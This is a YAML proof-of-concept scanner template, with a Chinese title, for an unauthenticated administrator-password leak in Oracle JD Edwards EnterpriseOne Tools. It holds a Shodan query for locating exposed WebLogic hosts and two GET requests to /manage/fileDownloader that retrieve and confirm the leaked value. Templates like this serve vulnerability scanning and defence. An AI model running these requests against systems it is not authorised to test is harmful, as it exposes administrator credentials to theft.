id: poc-yaml-jd-edwards-enterpriseone-tools-password-leaked
info:
  name: Oracle JDEdwards EnterpriseOne Tools未授权获取管理员密码泄漏
  severity: high
  tags:
  - 信息泄露
  finger: jd_edwards_enterpriseone_tools
  fofa: shodan：port:8999 product:"Oracle WebLogic Server"
requests:
- method: GET
  path: /manage/fileDownloader?sec=
  expression: "status_code == 200 && \ncontains(body,\"Managed Software Components\"\
    )\n"
- method: GET
  path: /manage/fileDownloader?sec=1
  expression: "status_code == 200 && \nmatches(body, \"^[A-Z]{44}$\") &&\ncontains(headers,\"\
    SMCONSOLE_SSID=\")\n"
variables: {}
transport: http
